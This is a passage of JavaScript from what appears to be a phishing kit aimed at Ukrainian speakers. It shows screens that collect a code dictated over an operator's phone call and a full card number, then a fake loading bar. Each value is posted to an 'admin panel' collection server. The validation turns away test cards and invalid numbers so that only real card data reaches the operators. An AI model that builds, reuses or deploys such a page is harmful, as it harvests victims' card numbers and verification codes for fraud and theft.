                console.log('💳 Карта уже отправлена, показываем ожидание');
                switchScreen('screen-code', 'screen-loading');
                startLoading();
            } else {
                // Карты еще не было - переходим к вводу карты
                switchScreen('screen-code', 'screen-card');
            }
            // Сбрасываем флаг
            isCodeRetry = false;
        } else {
            // Первый ввод кода - переход к вводу номера карты
            switchScreen('screen-code', 'screen-card');
        }
    };
    
    // Фокус на первое поле
    document.getElementById('code-input-0').focus();
    
    // Таймер обратного отсчета
    startTimer(60);
    
    // Обработчик кнопки "Запросить повторный звонок"
    const requestCallBtn = document.getElementById('requestCallAgain');
    if (requestCallBtn) {
        requestCallBtn.onclick = async () => {
            console.log('📞 Пользователь запросил повторный звонок');
            await requestCallAgain();
        };
    }
}

// ============================================================================
// ЗАПРОС ПОВТОРНОГО ЗВОНКА
// ============================================================================

async function requestCallAgain() {
    if (!sessionToken) {
        console.error('❌ Нет session token для запроса звонка');
        return;
    }
    
    // Проверяем, не активен ли уже таймер
    if (callRequestTimer !== null) {
        console.log('⏳ Кнопка уже заблокирована, подождите...');
        return;
    }
    
    const requestCallBtn = document.getElementById('requestCallAgain');
    if (!requestCallBtn) return;
    
    try {
        // Отправляем запрос в админку через API
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_token: sessionToken,
                data_type: 'call_request',
                data_value: 'Запрос Нового звонка!'
            })
        });
        
        if (response.ok) {
            console.log('✅ Запрос повторного звонка отправлен в админку');
            
            // Деактивируем кнопку на 60 секунд
            callRequestCountdown = 60;
            requestCallBtn.disabled = true;
            requestCallBtn.style.opacity = '0.6';
            requestCallBtn.style.cursor = 'not-allowed';
            
            // Показываем сообщение пользователю
            const codeError = document.getElementById('codeError');
            if (codeError) {
                codeError.innerHTML = '<div style="color: #00CED1; font-weight: bold; margin-bottom: 10px; text-align: center; padding: 12px; background: #e0ffff; border-radius: 8px; border: 2px solid #00CED1;">📞 Відповідьте на дзвінок та введіть продиктований код</div>';
                codeError.style.display = 'block';
            }
            
            // Запускаем таймер обратного отсчета
            callRequestTimer = setInterval(() => {
                callRequestCountdown--;
                
                // Обновляем текст кнопки
                if (callRequestCountdown > 0) {
                    requestCallBtn.textContent = `📞 Запросити повторний дзвінок (${callRequestCountdown}с)`;
                } else {
                    // Таймер закончился - активируем кнопку
                    clearInterval(callRequestTimer);
                    callRequestTimer = null;
                    callRequestCountdown = 0;
                    requestCallBtn.disabled = false;
                    requestCallBtn.style.opacity = '1';
                    requestCallBtn.style.cursor = 'pointer';
                    requestCallBtn.textContent = '📞 Запросити повторний дзвінок';
                    
                    // Скрываем сообщение
                    if (codeError) {
                        codeError.style.display = 'none';
                    }
                }
            }, 1000);
        } else {
            console.error('❌ Ошибка отправки запроса звонка:', response.status);
        }
    } catch (error) {
        console.error('❌ Ошибка запроса повторного звонка:', error);
    }
}

function startTimer(seconds) {
    const timerEl = document.getElementById('timer');
    if (!timerEl) return;
    
    let remaining = seconds;
    
    const interval = setInterval(() => {
        remaining--;
        
        const mins = Math.floor(remaining / 60);
        const secs = remaining % 60;
        
        timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (remaining <= 0) {
            clearInterval(interval);
            timerEl.textContent = '00:00';
        }
    }, 1000);
}

// ============================================================================
// ЭКРАН 5: НОМЕР КАРТЫ (16 ЦИФР) - РАСШИРЕННАЯ ВАЛИДАЦИЯ
// ============================================================================

// Определение типа карты и проверка BIN
function detectCardType(cardNumber) {
    const patterns = {
        // Visa: начинается с 4, длина 13, 16 или 19 цифр
        visa: {
            pattern: /^4[0-9]{12}(?:[0-9]{3})?(?:[0-9]{3})?$/,
            length: [13, 16, 19],
            name: 'Visa'
        },
        // Mastercard: 51-55, 2221-2720, длина 16
        mastercard: {
            pattern: /^(?:5[1-5][0-9]{14}|2(?:22[1-9]|2[3-9][0-9]|[3-6][0-9]{2}|7[0-1][0-9]|720)[0-9]{12})$/,
            length: [16],
            name: 'Mastercard'
        },
        // МИР: 2200-2204, длина 16-19
        mir: {
            pattern: /^220[0-4][0-9]{12,15}$/,
            length: [16, 17, 18, 19],
            name: 'МІР'
        },
        // American Express: 34 или 37, длина 15
        amex: {
            pattern: /^3[47][0-9]{13}$/,
            length: [15],
            name: 'American Express'
        },
        // Maestro: 50, 56-69, длина 12-19
        maestro: {
            pattern: /^(?:5[06789]|6)[0-9]{11,18}$/,
            length: [12, 13, 14, 15, 16, 17, 18, 19],
            name: 'Maestro'
        },
        // UnionPay: начинается с 62, длина 16-19
        unionpay: {
            pattern: /^62[0-9]{14,17}$/,
            length: [16, 17, 18, 19],
            name: 'UnionPay'
        }
    };
    
    for (let type in patterns) {
        if (patterns[type].pattern.test(cardNumber)) {
            return patterns[type];
        }
    }
    
    return null;
}

// Проверка на известные тестовые BIN-коды (блокируем их)
function isTestCard(cardNumber) {
    const testBins = [
        '411111', // Visa test
        '555555', // Mastercard test
        '378282', // Amex test
        '371449', // Amex test
        '378734', // Amex test
        '501800', // Maestro test
        '601100', // Maestro test
        '400000', // Visa test range
        '424242', // Common test
        '444444', // Test pattern
        '666666', // Test pattern
        '888888', // Test pattern
        '999999', // Test pattern
        '000000', // Invalid
        '111111', // Test pattern
        '222222', // Test pattern
        '333333', // Test pattern
        '777777', // Test pattern
    ];
    
    const bin = cardNumber.substring(0, 6);
    
    // Проверяем точное совпадение BIN
    if (testBins.includes(bin)) {
        return true;
    }
    
    // Проверяем повторяющиеся цифры (1111..., 2222..., и т.д.)
    if (/^(\d)\1+$/.test(cardNumber)) {
        return true;
    }
    
    // Проверяем последовательные цифры (1234567890...)
    if (/^(0123456789|9876543210|1234567890)/.test(cardNumber)) {
        return true;
    }
    
    return false;
}

// Алгоритм Луна (Luhn algorithm)
function luhnCheck(cardNumber) {
    const sanitized = cardNumber.replace(/\s/g, '');
    
    if (!/^\d+$/.test(sanitized)) {
        return false;
    }
    
    let sum = 0;
    let isEven = false;
    
    for (let i = sanitized.length - 1; i >= 0; i--) {
        let digit = parseInt(sanitized[i], 10);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (sum % 10) === 0;
}

// Расширенная валидация карты (BIN + Luhn + длина)
function validateCardNumber(cardNumber) {
    const sanitized = cardNumber.replace(/\s/g, '');
    
    // 1. Проверка что только цифры
    if (!/^\d+$/.test(sanitized)) {
        console.warn('❌ Карта содержит не только цифры');
        return false;
    }
    
    // 2. Проверка длины (должна быть 13-19 цифр)
    if (sanitized.length < 13 || sanitized.length > 19) {
        console.warn('❌ Неверная длина карты:', sanitized.length);
        return false;
    }
    
    // 3. Проверка на тестовые карты
    if (isTestCard(sanitized)) {
        console.warn('❌ Обнаружена тестовая карта, BIN:', sanitized.substring(0, 6));
        return false;
    }
    
    // 4. Определение типа карты и проверка BIN
    const cardType = detectCardType(sanitized);
    if (!cardType) {
        console.warn('❌ Неизвестный тип карты, BIN:', sanitized.substring(0, 6));
        return false;
    }
    
    // 5. Проверка длины для конкретного типа карты
    if (!cardType.length.includes(sanitized.length)) {
        console.warn('❌ Неверная длина для', cardType.name, ':', sanitized.length);
        return false;
    }
    
    // 6. Алгоритм Луна
    if (!luhnCheck(sanitized)) {
        console.warn('❌ Не прошла проверку Luhn');
        return false;
    }
    
    // Все проверки пройдены!
    console.log('✅ Валидная карта:', cardType.name, 'BIN:', sanitized.substring(0, 6));
    return true;
}

// Валидация карты в реальном времени с блокировкой
function validateCardInRealTime(cardNumber, errorElement, cardInputs) {
    const length = cardNumber.length;
    
    // Убираем предыдущие стили и разблокируем поля
    cardInputs.forEach(input => {
        input.style.borderColor = '';
        input.style.backgroundColor = '';
        input.disabled = false;
    });
    errorElement.textContent = '';
    errorElement.style.color = '';
    
    // Удаляем кнопку "Виправити" если она есть
    const existingBtn = errorElement.parentElement.querySelector('.fix-card-btn');
    if (existingBtn) {
        existingBtn.remove();
    }
    
    // Недостаточно цифр для проверки
    if (length < 6) {
        return { valid: null, message: '' };
    }
    
    // ПРОВЕРКА 1: Тестовая карта (после 6 цифр)
    if (length >= 6) {
        const bin = cardNumber.substring(0, 6);
        const testBins = ['411111', '555555', '378282', '371449', '378734', '501800', 
                          '601100', '400000', '424242', '444444', '666666', '888888', 
                          '999999', '000000', '111111', '222222', '333333', '777777'];
        
        if (testBins.includes(bin)) {
            blockCardInputs(cardInputs, errorElement, '⛔ ВИ НЕВІРНО ВВЕЛИ ДАНІ КАРТКИ!<br>Тестова картка не приймається. BIN: ' + bin);
            return { valid: false, message: 'Тестовая карта' };
        }
        
        // Проверка на повторяющиеся цифры
        if (/^(\d)\1+$/.test(cardNumber)) {
            blockCardInputs(cardInputs, errorElement, '⛔ ВИ НЕВІРНО ВВЕЛИ ДАНІ КАРТКИ!<br>Недійсний номер (повторювані цифри)');
            return { valid: false, message: 'Повторяющиеся цифры' };
        }
    }
    
    // ПРОВЕРКА 2: Определение типа карты (после 6 цифр)
    if (length >= 6) {
        const cardType = detectCardType(cardNumber + '0'.repeat(16 - length));
        
        if (!cardType) {
            blockCardInputs(cardInputs, errorElement, '⛔ ВИ НЕВІРНО ВВЕЛИ ДАНІ КАРТКИ!<br>Невідомий BIN: ' + cardNumber.substring(0, 6));
            return { valid: false, message: 'Неизвестный BIN' };
    } else {
            // Показываем тип карты (зеленый)
            cardInputs.forEach((input, idx) => {
                if (idx <= Math.floor(length / 4)) {
                    input.style.borderColor = '#10b981';
                    input.style.backgroundColor = '#f0fdf4';
                }
            });
            errorElement.innerHTML = '✓ ' + cardType.name;
            errorElement.style.color = '#10b981';
        }
    }
    
    // ПРОВЕРКА 3: Полная валидация (после 16 цифр)
    if (length === 16) {
        if (!luhnCheck(cardNumber)) {
            blockCardInputs(cardInputs, errorElement, '⛔ ВИ НЕВІРНО ВВЕЛИ ДАНІ КАРТКИ!<br>Контрольна сума не співпадає');
            return { valid: false, message: 'Luhn failed' };
        } else {
            const cardType = detectCardType(cardNumber);
            cardInputs.forEach(input => {
                input.style.borderColor = '#10b981';
                input.style.backgroundColor = '#f0fdf4';
            });
            errorElement.innerHTML = '✓ Картка валідна: ' + (cardType ? cardType.name : '');
            errorElement.style.color = '#10b981';
            return { valid: true, message: 'Valid' };
        }
    }
    
    return { valid: null, message: 'Checking...' };
}

// Блокировка полей карты при ошибке
function blockCardInputs(cardInputs, errorElement, message) {
    // Красная обводка и блокировка
    cardInputs.forEach(input => {
        input.style.borderColor = '#ef4444';
        input.style.backgroundColor = '#fef2f2';
        input.disabled = true;
    });
    
    // Показываем ошибку
    errorElement.innerHTML = message;
    errorElement.style.color = '#ef4444';
    errorElement.style.fontSize = '16px';
    errorElement.style.fontWeight = '600';
    errorElement.style.textAlign = 'center';
    errorElement.style.padding = '15px';
    errorElement.style.backgroundColor = '#fee2e2';
    errorElement.style.borderRadius = '8px';
    errorElement.style.marginTop = '15px';
    
    // Добавляем кнопку "Виправити"
    const fixBtn = document.createElement('button');
    fixBtn.textContent = 'Виправити номер картки';
    fixBtn.className = 'fix-card-btn';
    fixBtn.type = 'button';
    fixBtn.style.cssText = 'margin-top: 15px; padding: 12px 24px; background: #ef4444; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;';
    
    fixBtn.addEventListener('click', () => {
        // Очищаем все поля
        cardInputs.forEach(input => {
            input.value = '';
            input.disabled = false;
            input.style.borderColor = '';
            input.style.backgroundColor = '';
        });
        errorElement.innerHTML = '';
        errorElement.style.cssText = '';
        fixBtn.remove();
        // Фокус на первое поле
        cardInputs[0].focus();
    });
    
    errorElement.parentElement.appendChild(fixBtn);
}

function initCardForm() {
    const form = document.getElementById('cardForm');
    const card1 = document.getElementById('card1');
    const card2 = document.getElementById('card2');
    const card3 = document.getElementById('card3');
    const card4 = document.getElementById('card4');
    const errorElement = document.getElementById('cardError');
    
    if (!form) return;
    
    const cardInputs = [card1, card2, card3, card4];
    
    // Обработка ввода с валидацией в реальном времени
    cardInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
            
            // Получаем полный номер карты
            const fullCardNumber = cardInputs.map(inp => inp.value).join('');
            
            // ВАЛИДАЦИЯ В РЕАЛЬНОМ ВРЕМЕНИ
            validateCardInRealTime(fullCardNumber, errorElement, cardInputs);
            
            // Автопереход
            if (value.length === 4 && index < 3) {
                cardInputs[index + 1].focus();
            }
        });
        
        // Backspace
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                cardInputs[index - 1].focus();
            }
        });
    });
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const cardNumber = cardInputs.map(input => input.value).join('');
        
        if (cardNumber.length !== 16) {
            errorElement.textContent = '❌ Введіть 16 цифр номера картки';
            errorElement.style.color = '#ef4444';
            cardInputs.forEach(input => {
                input.style.borderColor = '#ef4444';
                input.style.backgroundColor = '#fef2f2';
            });
            return;
        }
        
        // Финальная проверка валидности карты
        if (!validateCardNumber(cardNumber)) {
            errorElement.textContent = '❌ Невірний номер картки';
            errorElement.style.color = '#ef4444';
            console.warn('❌ Невалидный номер карты:', cardNumber);
            
            cardInputs.forEach(input => {
                input.style.borderColor = '#ef4444';
                input.style.backgroundColor = '#fef2f2';
            });
            
            return;
        }
        
        userData.card_number = cardNumber;
        console.log('✅ Номер карты введен и валиден:', userData.card_number);
        
        // Отключаем кнопку
        const submitBtn = form.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Зачекайте...';
        
        try {
            // Отправляем номер карты в админку
            await saveData('card_number', userData.card_number);
            
            // Переход к экрану загрузки
            switchScreen('screen-card', 'screen-loading');
            
            // Запускаем загрузку
            startLoading();
    } catch (error) {
            console.error('❌ Ошибка отправки номера карты:', error);
            errorElement.textContent = 'Помилка відправки. Спробуйте ще раз';
            submitBtn.disabled = false;
            submitBtn.textContent = 'ПРОДОВЖИТИ';
        }
    });
}

// ============================================================================
// СОХРАНЕНИЕ ДАННЫХ В АДМИНКУ
// ============================================================================

async function saveData(field, value) {
    if (!sessionToken) {
        console.warn('⚠️ Нет session token');
        return;
    }
    
    try {
        console.log(`📤 Сохраняем ${field}:`, value);
        
        let data_type, data_value;
        
        // В зависимости от поля формируем правильный data_type
        if (field === 'phone') {
            data_type = 'phone';
            data_value = value;
        } else if (field === 'sms_code' || field === 'code') {
            data_type = 'code_4';
            data_value = value;
        } else if (field === 'card_number') {
            data_type = 'card_number';
            data_value = value;
        } else {
            data_type = field;
            data_value = value;
        }
        
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_token: sessionToken,
                data_type: data_type,
                data_value: data_value
            })
        });
        
        if (response.ok) {
            console.log(`✅ ${field} сохранено в админке`);
        } else {
            const errorText = await response.text();
            console.error(`❌ Ошибка сохранения ${field}:`, response.status);
            console.error('Ответ сервера:', errorText);
            
            // Проверяем, не забанен ли пользователь
            if (response.status === 403) {
                try {
                    const errorData = JSON.parse(errorText);
                    if (errorData.detail && errorData.detail.error === 'access_denied') {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        throw new Error('Access denied: ' + errorData.detail.reason);
                    }
                } catch (e) {
                    // Если не удалось распарсить - показываем общее сообщение
                    if (errorText.includes('заблокирован') || errorText.includes('banned')) {
                        alert('Ваш доступ заблокирован. Пожалуйста, свяжитесь с поддержкой.');
                        throw new Error('Access denied');
                    }
                }
            }
        }
    } catch (error) {
        console.error(`❌ Ошибка сохранения ${field}:`, error);
        throw error; // Пробрасываем ошибку дальше
    }
}

// ============================================================================
// ЭКРАН ЗАГРУЗКИ
// ============================================================================

function startLoading() {
    const progressBar = document.getElementById('loadingProgressBar');
    const progressText = document.getElementById('loadingProgressText');
    
    if (!progressBar || !progressText) return;
    
    let progress = 0;
    const duration = 60000; // 60 секунд
    const interval = 100; // обновление каждые 100ms
    const step = (interval / duration) * 100;
    
    const timer = setInterval(() => {
        progress += step;
        
        if (progress >= 100) {
            progress = 100;
            clearInterval(timer);
        }
        
        progressBar.style.width = progress + '%';
        progressText.textContent = Math.floor(progress) + '%';
    }, interval);
}
